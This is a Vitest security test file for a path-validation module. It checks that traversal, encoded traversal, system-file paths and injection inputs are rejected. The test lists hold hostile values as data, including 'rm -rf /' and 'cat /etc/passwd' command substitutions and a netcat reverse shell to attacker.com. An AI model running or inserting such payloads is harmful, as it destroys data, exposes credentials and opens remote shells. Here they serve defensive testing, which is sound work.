/**
 * Security tests for path traversal vulnerability fixes
 */

import { describe, it, expect } from 'vitest';
import {
  validateAndNormalizePath,
  validateFilePatterns,
  createPathValidator,
} from '../src/path-validation.js';

describe('Path Validation Security Tests', () => {
  describe('validateAndNormalizePath', () => {
    it('should reject null byte injection', () => {
      expect(() => validateAndNormalizePath('path\0malicious')).toThrow(
        'Path must be a non-empty string',
      );
      expect(() => validateAndNormalizePath('path\0')).toThrow();
    });

    it('should reject obvious path traversal attempts', () => {
      expect(() => validateAndNormalizePath('../../../etc/passwd')).toThrow(
        'Path traversal detected',
      );
      expect(() => validateAndNormalizePath('..\\..\\..\\windows\\system32\\config\\sam')).toThrow(
        'Path traversal detected',
      );
      expect(() => validateAndNormalizePath('folder/../../../etc/passwd')).toThrow(
        'Path traversal detected',
      );
    });

    it('should reject encoded path traversal attempts', () => {
      expect(() => validateAndNormalizePath('..%2F..%2F..%2Fetc%2Fpasswd')).toThrow(
        'Encoded path traversal detected',
      );
      expect(() => validateAndNormalizePath('..%5C..%5C..%5Cwindows%5Csystem32')).toThrow(
        'Encoded path traversal detected',
      );
    });

    it('should reject absolute paths when not allowed', () => {
      expect(() => validateAndNormalizePath('/etc/passwd')).toThrow('Absolute paths not allowed');
      expect(() => validateAndNormalizePath('C:\\Windows\\System32')).toThrow(
        'Absolute paths not allowed',
      );
    });

    it('should reject suspicious system directory patterns', () => {
      expect(() => validateAndNormalizePath('folder/etc/passwd')).toThrow(
        'Suspicious path pattern detected',
      );
      expect(() => validateAndNormalizePath('folder/proc/cpuinfo')).toThrow(
        'Suspicious path pattern detected',
      );
      expect(() => validateAndNormalizePath('folder/sys/kernel')).toThrow(
        'Suspicious path pattern detected',
      );
      expect(() => validateAndNormalizePath('folder/windows/system32')).toThrow(
        'Suspicious path pattern detected',
      );
      expect(() => validateAndNormalizePath('folder/program files/app')).toThrow(
        'Suspicious path pattern detected',
      );
      expect(() => validateAndNormalizePath('folder/users/admin')).toThrow(
        'Suspicious path pattern detected',
      );
    });

    it('should allow safe relative paths', () => {
      expect(validateAndNormalizePath('src/index.ts')).toBe('src/index.ts');
      expect(validateAndNormalizePath('docs/readme.md')).toBe('docs/readme.md');
      expect(validateAndNormalizePath('packages/utils/helper.js')).toBe('packages/utils/helper.js');
    });

    it('should normalize path separators', () => {
      expect(validateAndNormalizePath('src\\index.ts')).toBe('src/index.ts');
      expect(validateAndNormalizePath('packages/utils\\helper.js')).toBe(
        'packages/utils/helper.js',
      );
    });

    it('should handle empty and current directory components', () => {
      expect(validateAndNormalizePath('src/./index.ts')).toBe('src/index.ts');
      expect(validateAndNormalizePath('./src/index.ts')).toBe('src/index.ts');
      expect(validateAndNormalizePath('src//index.ts')).toBe('src/index.ts');
    });

    it('should work with allowed base paths', () => {
      const allowedPaths = ['/home/user/project', '/var/www'];
      expect(validateAndNormalizePath('/home/user/project/src/index.ts', allowedPaths)).toBe(
        'home/user/project/src/index.ts',
      );
      expect(validateAndNormalizePath('/var/www/index.html', allowedPaths)).toBe(
        'var/www/index.html',
      );
    });

    it('should reject paths outside allowed base paths', () => {
      const allowedPaths = ['/home/user/project'];
      expect(() => validateAndNormalizePath('/etc/passwd', allowedPaths)).toThrow(
        'Path not within allowed base paths',
      );
      expect(() => validateAndNormalizePath('/var/www/index.html', allowedPaths)).toThrow(
        'Path not within allowed base paths',
      );
    });
  });

  describe('validateFilePatterns', () => {
    it('should reject non-array input', () => {
      expect(() => validateFilePatterns('not-an-array' as any)).toThrow(
        'Patterns must be an array',
      );
    });

    it('should reject empty strings in patterns', () => {
      expect(() => validateFilePatterns([''])).toThrow('Each pattern must be a non-empty string');
      expect(() => validateFilePatterns(['*.ts', ''])).toThrow(
        'Each pattern must be a non-empty string',
      );
    });

    it('should reject patterns with dangerous characters', () => {
      expect(() => validateFilePatterns(['$(rm -rf /)'])).toThrow(
        'Pattern contains potentially dangerous characters',
      );
      expect(() => validateFilePatterns(['`cat /etc/passwd`'])).toThrow(
        'Pattern contains potentially dangerous characters',
      );
      expect(() => validateFilePatterns(['file|cat'])).toThrow(
        'Pattern contains potentially dangerous characters',
      );
    });

    it('should validate safe glob patterns', () => {
      expect(validateFilePatterns(['*.ts', '*.js'])).toEqual(['*.ts', '*.js']);
      expect(validateFilePatterns(['src/**/*.ts', 'docs/*.md'])).toEqual([
        'src/**/*.ts',
        'docs/*.md',
      ]);
    });

    it('should apply path validation to each pattern', () => {
      expect(() => validateFilePatterns(['../../../etc/passwd'])).toThrow(
        'Path traversal detected',
      );
      expect(() => validateFilePatterns(['safe.ts', '../../../dangerous'])).toThrow(
        'Path traversal detected',
      );
    });
  });

  describe('createPathValidator', () => {
    it('should create a validator with specific allowed base paths', () => {
      const validator = createPathValidator(['/home/user/project']);

      expect(validator.validatePath('/home/user/project/src/index.ts')).toBe(
        'home/user/project/src/index.ts',
      );

      expect(() => validator.validatePath('/etc/passwd')).toThrow(
        'Path not within allowed base paths',
      );

      expect(validator.validatePatterns(['/home/user/project/*.ts'])).toEqual([
        '/home/user/project/*.ts',
      ]);
    });
  });

  describe('Real-world attack scenarios', () => {
    it('should prevent Linux system file access', () => {
      const attacks = [
        '../../../etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '/etc/passwd',
        '/etc/shadow',
        '/proc/version',
        '/sys/kernel/version',
        'config/../../../etc/passwd',
        'src/../../etc/passwd',
      ];

      attacks.forEach((attack) => {
        expect(() => validateAndNormalizePath(attack), `Should block: ${attack}`).toThrow();
      });
    });

    it('should prevent Windows system file access', () => {
      const attacks = [
        '..\\..\\..\\windows\\system32\\config\\sam',
        '..%5C..%5C..%5Cwindows%5Csystem32',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'windows/system32/config/sam',
        'program files/internet explorer/iexplore.exe',
        'users/administrator/desktop/secrets.txt',
      ];

      attacks.forEach((attack) => {
        expect(() => validateAndNormalizePath(attack), `Should block: ${attack}`).toThrow();
      });
    });

    it('should prevent log injection and command injection', () => {
      const attacks = [
        'file.txt\n[CRITICAL] System compromised',
        'file.txt\r\n[ERROR] Root access granted',
        'file$(cat /etc/passwd).txt',
        'file`whoami`.txt',
        'file|nc attacker.com 4444 -e /bin/bash.txt',
      ];

      attacks.forEach((attack) => {
        expect(() => validateAndNormalizePath(attack), `Should block: ${attack}`).toThrow();
      });
    });

    it('should allow legitimate file paths', () => {
      const legitimate = [
        'src/index.ts',
        'docs/readme.md',
        'packages/utils/helper.js',
        'tests/security.test.ts',
        'config/app.json',
        'public/css/style.css',
        'scripts/build.sh',
        'assets/images/logo.png',
        'data/import.csv',
        'lib/math/calculator.js',
      ];

      legitimate.forEach((path) => {
        expect(() => validateAndNormalizePath(path), `Should allow: ${path}`).not.toThrow();
      });
    });
  });
});
